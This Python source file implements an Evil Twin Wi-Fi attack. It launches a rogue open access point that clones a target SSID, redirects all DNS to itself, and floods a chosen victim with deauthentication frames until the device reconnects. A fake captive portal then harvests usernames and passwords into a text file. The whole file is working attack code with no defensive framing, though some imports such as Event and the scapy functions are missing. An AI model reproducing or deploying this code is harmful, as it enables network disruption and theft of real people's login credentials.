import subprocess, time
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# Event to stop deauth thread
_deauth_stop = Event()


def create_evil_ap(ap_info, iface):
    """
    Launch hostapd and dnsmasq to create an open Evil Twin AP.
    ap_info: dict with SSID and Channel
    """
    print("Creating Evil Twin AP...")
    ssid = ap_info['SSID']
    channel = ap_info['Channel']
    config = f"""
interface={iface}
ssid={ssid}
channel={channel}
hw_mode=g
auth_algs=1
ignore_broadcast_ssid=0
"""
    config_path = '/tmp/evil_hostapd.conf'
    with open(config_path, 'w') as f:
        f.write(config)
    # Run hostapd in background
    subprocess.Popen(
        ['hostapd', '-B', config_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    # Start dnsmasq for DHCP/DNS
    subprocess.Popen([
        'dnsmasq',
        f'--interface={iface}',
        '--dhcp-range=10.0.0.10,10.0.0.100,12h',
        '--no-resolv',
        '--server=8.8.8.8',
        '--address=/#/10.0.0.1'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"Evil AP '{ssid}' launched (open) on {iface}")


def _deauth_loop(real_bssid, victim_mac, iface):
    """Continuously send deauth frames in chunks until stopped."""
    pkt = RadioTap()/Dot11(addr1=victim_mac, addr2=real_bssid, addr3=real_bssid)/Dot11Deauth(reason=7)
    while not _deauth_stop.is_set():
        # Send a burst of 50 deauth packets
        for _ in range(50):
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.1)
        # Pause before next burst
        time.sleep(0.5)


def deauth_victim(ap_info, victim_mac, iface):
    """
    Start deauth attack and stop when victim associates to the Evil AP.
    Sends 50 deauth frames, waits 0.5s, repeats until association detected.
    """
    real_bssid = ap_info['BSSID']
    print(f"Starting deauth attack on {victim_mac}...")
    _deauth_stop.clear()
    # Launch deauth loop
    t = Thread(target=_deauth_loop, args=(real_bssid, victim_mac, iface), daemon=True)
    t.start()

    # Sniff for the victim's association to the Evil AP
    def assoc_filter(pkt):
        return pkt.haslayer(Dot11AssoReq) and pkt.addr2 == victim_mac and pkt.addr1 == real_bssid

    def assoc_handler(pkt):
        print(f"Detected association from {victim_mac} to Evil AP {real_bssid}. Stopping deauth.")
        _deauth_stop.set()

    # Blocks until assoc_filter returns True
    sniff(iface=iface, prn=assoc_handler, stop_filter=assoc_filter)
    t.join()
    print(f"Deauth attack ended for {victim_mac}")


def start_captive_portal(port=80):
    """
    Starts a simple captive portal on HTTP port 80 that captures credentials.
    """
    print("Starting captive portal...")
    class PortalHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            html = """
            <html><body>
              <h1>Wi-Fi Login Required</h1>
              <form method="POST">
                Username: <input name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
              </form>
            </body></html>
            """
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

        def do_POST(self):
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            data = urllib.parse.parse_qs(body)
            username = data.get('username', [''])[0]
            password = data.get('password', [''])[0]
            # Log creds
            with open('/tmp/credentials.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
            print(f"Captured credentials: {username}:{password}")
            # Acknowledge
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Login successful!</h1></body></html>")

    server = HTTPServer(('', port), PortalHandler)
    print(f"Captive portal running on port {port}")
    server.serve_forever()
